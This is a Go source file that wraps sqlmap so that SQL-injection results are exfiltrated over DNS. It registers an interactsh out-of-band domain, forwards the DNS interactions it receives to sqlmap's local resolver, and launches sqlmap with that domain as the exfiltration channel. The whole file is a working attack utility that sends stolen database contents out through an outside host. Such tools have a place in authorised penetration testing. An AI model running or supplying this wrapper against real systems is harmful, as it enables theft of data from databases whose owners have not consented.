package main

import (
	"context"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/projectdiscovery/interactsh/pkg/client"
	"github.com/projectdiscovery/interactsh/pkg/server"
)

func main() {

	var (
		dnsResolverIP        = "127.0.0.1:53" // SQLMap local DNS resolver.
		dnsResolverProto     = "udp"          // Protocol to use for the DNS resolver
		dnsResolverTimeoutMs = 1000           // Timeout (ms) for the DNS resolver (optional)

		interactshPollingTimeMs = 500 // Polling time (ms) to check for interaction in Interact.sh
	)

	dnsResolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Duration(dnsResolverTimeoutMs) * time.Millisecond,
			}
			return d.DialContext(ctx, dnsResolverProto, dnsResolverIP)
		},
	}

	// Create InteractSH client
	client, err := client.New(client.DefaultOptions)
	if err != nil {
		panic(err)
	}
	defer client.Close()

	URL := client.URL()

	// Read from interactsh and forward to SQLMap local DNS server
	client.StartPolling(time.Duration(interactshPollingTimeMs)*time.Millisecond, func(interaction *server.Interaction) {
		if interaction.Protocol == "dns" {
			dnsResolver.LookupHost(context.Background(), interaction.FullId)
		}
	})
	defer client.StopPolling()

	// Wrap SQLMap adding DNS domain for exfiltration
	os.Args[0] = "--dns-domain=" + URL
	sqlmapCmd := exec.Command("sqlmap", os.Args...)
	sqlmapCmd.Env = os.Environ()
	sqlmapCmd.Stdin = os.Stdin
	sqlmapCmd.Stdout = os.Stdout
	sqlmapCmd.Stderr = os.Stderr
	sqlmapCmd.Run()
}
